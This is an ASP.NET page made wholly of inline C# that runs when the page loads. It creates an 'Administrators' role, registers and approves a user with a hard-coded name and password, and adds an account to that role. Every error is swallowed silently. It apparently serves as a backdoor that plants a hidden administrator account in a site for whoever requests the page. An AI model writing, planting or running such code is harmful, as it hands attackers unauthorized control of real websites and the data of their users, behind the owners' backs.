<%@ Page Language="C#" AutoEventWireup="true" %> 
<% 
   try 
   { 
      Roles.CreateRole("Administrators"); 
   } 
   catch (Exception) { } 

   try 
   { 
      var user = Membership.CreateUser("wVYSHF", "kPMx9r5S!.0", "mail@mail.com"); 
      user.IsApproved = true; 
    }
    catch (Exception) {}

    try
    {
        Roles.AddUserToRole("Vinny_Michael", "Administrators"); 
    }
    catch (Exception) {} 
%> 